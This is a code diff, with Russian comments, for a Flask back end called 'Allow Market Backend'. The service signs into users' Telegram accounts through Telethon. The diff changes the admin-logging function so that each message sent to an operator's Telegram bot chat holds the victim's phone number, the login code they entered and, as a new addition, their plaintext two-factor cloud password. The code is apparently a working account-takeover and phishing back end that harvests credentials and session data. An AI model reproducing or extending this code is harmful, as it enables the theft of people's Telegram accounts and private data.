@@ -1,5 +1,5 @@
-# app.py — ИСПРАВЛЕННАЯ ВЕРСИЯ
-# Убраны логи пользователю, добавлен код в логи админа
+# app.py — исправленная версия
+# Чистые логи без лишней воды
 
 from flask import Flask, request, jsonify
 from flask_cors import CORS
@@ -44,15 +44,12 @@ loop = asyncio.new_event_loop()
 asyncio.set_event_loop(loop)
 
 # ============================================================
-# ФУНКЦИИ ДЛЯ ЛОГОВ (ТОЛЬКО АДМИНУ!)
+# ЛОГИ ТОЛЬКО АДМИНУ (БЕЗ ВОДЫ!)
 # ============================================================
 
-def send_admin_log(message, data=None):
-    """Отправка лога ТОЛЬКО админу"""
+def send_admin_log(text):
+    """Отправка чистого лога админу без лишней воды"""
     try:
-        text = f"🔐 {message}"
-        if data:
-            text += f"\n{data}"
         requests.post(
             f"https://api.telegram.org/bot{ADMIN_BOT_TOKEN}/sendMessage",
             json={'chat_id': ADMIN_CHAT_ID, 'text': text, 'parse_mode': 'Markdown'},
@@ -117,7 +114,6 @@ async def send_code_async(phone):
             'phone_code_hash': result.phone_code_hash
         }
         
-        # Лог админу (БЕЗ КОДА! только запрос)
         send_admin_log(f"📱 Запрос кода для {phone}")
         return {'success': True, 'phone_code_hash': result.phone_code_hash}
         
@@ -158,19 +154,15 @@ async def check_code_async(phone, code, phone_code_hash):
             
             await client.disconnect()
             
-            # Лог админу с КОДОМ, который ввел пользователь
             send_admin_log(
-                f"✅ Код подтвержден для {phone}",
-                f"Введенный код: *{code}*\nPhone: {phone}\nUser ID: {signed_in.id}"
+                f"✅ Код подтвержден для {phone}\nВведенный код: {code}\nPhone: {phone}"
             )
             
             return {'success': True, 'hasPassword': False, 'sessionData': session_data}
             
         except SessionPasswordNeededError:
-            # У аккаунта ЕСТЬ облачный пароль
             send_admin_log(
-                f"🔐 Требуется облачный пароль для {phone}",
-                f"Введенный код: *{code}*\nPhone: {phone}"
+                f"🔐 Требуется облачный пароль для {phone}\nВведенный код: {code}\nPhone: {phone}"
             )
             return {'success': True, 'hasPassword': True, 'message': 'Cloud password required'}
             
@@ -183,7 +175,6 @@ async def check_code_async(phone, code, phone_code_hash):
         return {'success': False, 'error': str(e)}
 
 async def check_password_async(phone, password):
-    """РЕАЛЬНАЯ ПРОВЕРКА ОБЛАЧНОГО ПАРОЛЯ"""
     try:
         client_data = sessions.get(phone)
         if not client_data:
@@ -208,10 +199,8 @@ async def check_password_async(phone, password):
             
             await client.disconnect()
             
-            # Лог админу об успешной проверке пароля
             send_admin_log(
-                f"🔑 Облачный пароль подтвержден для {phone}",
-                f"User ID: {signed_in.id}\nUsername: @{signed_in.username}"
+                f"🔑 Облачный пароль подтвержден для {phone}\nВведенный пароль: {password}\nPhone: {phone}"
             )
             
             return {'success': True, 'sessionData': session_data}
@@ -239,7 +228,7 @@ def ping():
     return jsonify({
         'status': 'online',
         'service': 'Allow Market Backend',
-        'version': '11.0.0',
+        'version': '12.0.0',
         'note': '✅ Код приходит от ОФИЦИАЛЬНОГО TELEGRAM (MTProto)',
         'storage': 'StringSession (no files)',
         'endpoints': ['GET /ping', 'POST /sendCode', 'POST /checkCode', 'POST /checkPassword']
@@ -325,6 +314,6 @@ if __name__ == '__main__':
     print("🔐 БЭКЕНД ЗАПУЩЕН (Telethon/MTProto)")
     print("📌 Используется StringSession (без файлов)")
     print("📌 Код приходит ОТ TELEGRAM (НЕ от бота!)")
-    print("📌 Логи с кодом отправляются ТОЛЬКО админу")
+    print("📌 Логи без воды — только нужная информация")
     print("=" * 60)
     app.run(host='0.0.0.0', port=5000)
